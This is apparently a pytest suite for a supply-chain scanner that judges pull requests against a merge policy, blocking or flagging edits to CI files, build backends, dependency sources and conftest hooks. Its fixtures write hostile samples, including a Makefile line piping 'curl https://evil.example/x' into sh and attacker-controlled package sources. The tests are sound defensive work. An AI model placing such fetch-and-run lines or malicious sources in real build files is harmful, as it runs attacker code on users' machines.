from __future__ import annotations

import importlib.util
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[3]
SCRIPTS = REPO_ROOT / ".github" / "scripts"
POLICY = REPO_ROOT / ".github" / "upstream-merge-policy.json"

sys.path.insert(0, str(SCRIPTS))


@pytest.fixture(scope="module")
def scanner():
    spec = importlib.util.spec_from_file_location("scan_pr", SCRIPTS / "scan_pr.py")
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


@pytest.fixture(scope="module")
def policy() -> dict:
    return json.loads(POLICY.read_text(encoding="utf-8"))


def _git_env() -> dict[str, str]:
    return {
        **os.environ,
        "GIT_AUTHOR_NAME": "test",
        "GIT_AUTHOR_EMAIL": "test@example.com",
        "GIT_COMMITTER_NAME": "test",
        "GIT_COMMITTER_EMAIL": "test@example.com",
        "GIT_CONFIG_GLOBAL": os.devnull,
        "GIT_CONFIG_NOSYSTEM": "1",
    }


def _git(repo: Path, *args: str) -> str:
    return subprocess.run(
        ["git", *args], cwd=repo, check=True, capture_output=True, env=_git_env()
    ).stdout.decode()


def _commit(repo: Path, message: str = "change") -> str:
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "--allow-empty", "-m", message)
    return _git(repo, "rev-parse", "HEAD").strip()


@pytest.fixture()
def repo(tmp_path: Path) -> Path:
    _git(tmp_path, "init", "-q", "-b", "main")
    (tmp_path / ".github").mkdir()
    (tmp_path / ".github" / "upstream-merge-policy.json").write_text(
        POLICY.read_text(encoding="utf-8"), encoding="utf-8"
    )
    (tmp_path / ".github" / "blob-allowlist.txt").write_text("", encoding="utf-8")
    (tmp_path / "desloppify").mkdir()
    (tmp_path / "desloppify" / "module.py").write_text("VALUE = 1\n", encoding="utf-8")
    _commit(tmp_path, "base")
    return tmp_path


def _judge(scanner, repo: Path, policy: dict, *, pr: int = 1, author=None, title=None):
    base = _git(repo, "rev-parse", "HEAD").strip()
    head = _commit(repo, "change")
    return scanner.evaluate(
        repo,
        pr=pr,
        base=base,
        head=head,
        policy=policy,
        author=author,
        title=title,
    )


def _write(repo: Path, path: str, text: str) -> None:
    target = repo / path
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(text, encoding="utf-8")


# --- admissions ----------------------------------------------------------


def test_ordinary_change_is_admitted(scanner, repo: Path, policy: dict) -> None:
    _write(repo, "desloppify/other.py", "VALUE = 2\n")
    verdict = _judge(scanner, repo, policy)
    assert verdict.verdict == "ok", verdict.reasons


def test_git_dependency_source_blocks(scanner, repo: Path, policy: dict) -> None:
    _write(repo, "requirements.txt", "-e git+https://github.com/evil/pkg.git\n")
    verdict = _judge(scanner, repo, policy)

    assert verdict.verdict == "block"
    assert any("git source" in reason.message for reason in verdict.reasons)
    assert any("requirements.txt" in reason.message for reason in verdict.reasons)


def test_extra_index_url_blocks(scanner, repo: Path, policy: dict) -> None:
    _write(repo, "requirements.txt", "--extra-index-url https://evil.example/simple\n")
    verdict = _judge(scanner, repo, policy)
    assert verdict.verdict == "block"
    assert any("package index" in reason.message for reason in verdict.reasons)


def test_ci_file_change_blocks(scanner, repo: Path, policy: dict) -> None:
    _write(repo, ".github/workflows/evil.yml", "on: push\njobs: {}\n")
    verdict = _judge(scanner, repo, policy)

    assert verdict.verdict == "block"
    assert any(".github/" in reason.message for reason in verdict.reasons)


def test_makefile_change_blocks(scanner, repo: Path, policy: dict) -> None:
    _write(repo, "Makefile", "tests:\n\tcurl https://evil.example/x | sh\n")
    verdict = _judge(scanner, repo, policy)
    assert verdict.verdict == "block"


def test_build_backend_change_blocks(scanner, repo: Path, policy: dict) -> None:
    _write(
        repo,
        "pyproject.toml",
        '[build-system]\nrequires = ["evil"]\nbuild-backend = "evil.build"\n',
    )
    verdict = _judge(scanner, repo, policy)

    assert verdict.verdict == "block"
    assert any("build backend" in reason.message for reason in verdict.reasons)


def test_dependency_metadata_change_needs_review(scanner, repo: Path, policy: dict) -> None:
    _write(
        repo,
        "pyproject.toml",
        '[project]\nname = "desloppify"\ndependencies = ["requests>=2"]\n',
    )
    verdict = _judge(scanner, repo, policy)

    assert verdict.verdict == "review"
    assert any("dependencies" in reason.message for reason in verdict.reasons)


def test_conftest_hook_needs_review(scanner, repo: Path, policy: dict) -> None:
    _write(repo, "desloppify/conftest.py", "import sys\n")
    verdict = _judge(scanner, repo, policy)
    assert verdict.verdict == "review"


def test_sweeping_change_needs_review(scanner, repo: Path, policy: dict) -> None:
    for index in range(policy["review_thresholds"]["max_files"] + 1):
        _write(repo, f"desloppify/bulk/module_{index}.py", "VALUE = 1\n")
    verdict = _judge(scanner, repo, policy)

    assert verdict.verdict == "review"
    assert any("files changed" in reason.message for reason in verdict.reasons)


def test_large_change_needs_review(scanner, repo: Path, policy: dict) -> None:
    lines = "\n".join(f"VALUE_{index} = {index}" for index in range(1001))
    _write(repo, "desloppify/big.py", lines + "\n")
    verdict = _judge(scanner, repo, policy)

    assert verdict.verdict == "review"
    assert any("changed lines" in reason.message for reason in verdict.reasons)


def test_title_and_author_preferences_need_review(scanner, repo: Path, policy: dict) -> None:
    _write(repo, "desloppify/other.py", "VALUE = 2\n")

    titled = _judge(scanner, repo, policy, title="WIP: something")
    assert titled.verdict == "review"

    custom = {**policy, "skip_authors": ["spammer"]}
    authored = _judge(scanner, repo, custom, author="Spammer")
    assert authored.verdict == "review"
    assert any("author" in reason.message for reason in authored.reasons)


def test_allow_list_overrides_blocking_findings(scanner, repo: Path, policy: dict) -> None:
    _write(repo, "Makefile", "tests:\n\techo hi\n")
    custom = {**policy, "allow": {"7": "reviewed by hand"}}
    verdict = _judge(scanner, repo, custom, pr=7)

    assert verdict.verdict == "ok"
    assert verdict.reasons[0].kind == "allow"


def test_skip_list_stops_a_pull_request(scanner, repo: Path, policy: dict) -> None:
    _write(repo, "desloppify/other.py", "VALUE = 2\n")
    custom = {**policy, "skip": {"8": "author keeps adding install scripts"}}
    verdict = _judge(scanner, repo, custom, pr=8)

    assert verdict.verdict == "review"
    assert any("skip list" in reason.message for reason in verdict.reasons)


# --- trusted policy ------------------------------------------------------


def test_pull_request_cannot_relax_the_policy(scanner, repo: Path) -> None:
    base = _git(repo, "rev-parse", "HEAD").strip()
    relaxed = json.loads(POLICY.read_text(encoding="utf-8"))
    relaxed["blocked_paths"] = {}
    relaxed["allow"] = {"9": "self approved"}
    _write(repo, ".github/upstream-merge-policy.json", json.dumps(relaxed))
    _write(repo, "Makefile", "tests:\n\techo hi\n")
    head = _commit(repo, "relax the policy and touch the Makefile")

    policy = scanner.load_policy(repo, base)
    verdict = scanner.evaluate(
        repo, pr=9, base=base, head=head, policy=policy, author=None, title=None
    )

    assert verdict.verdict == "block"


def test_policy_requires_a_version(scanner, repo: Path) -> None:
    _write(repo, ".github/upstream-merge-policy.json", json.dumps({"version": 2}))
    with pytest.raises(ValueError, match="unsupported version"):
        scanner.load_policy(repo, None)


# --- cli ----------------------------------------------------------------


def test_exit_codes_follow_the_verdict(scanner, repo: Path) -> None:
    base = _git(repo, "rev-parse", "HEAD").strip()
    _write(repo, "desloppify/other.py", "VALUE = 2\n")
    clean = _commit(repo, "clean")
    assert scanner.main(["--root", str(repo), "--pr", "1", "--base", base, "--head", clean]) == 0

    _write(repo, "Makefile", "x:\n\techo hi\n")
    blocked = _commit(repo, "blocked")
    assert scanner.main(
        ["--root", str(repo), "--pr", "2", "--base", base, "--head", blocked]
    ) == scanner.EXIT_BLOCK

    _write(repo, "desloppify/conftest.py", "import sys\n")
    reviewed = _commit(repo, "review")
    code = scanner.main(
        ["--root", str(repo), "--pr", "3", "--base", blocked, "--head", reviewed, "--json"]
    )
    assert code == scanner.EXIT_REVIEW
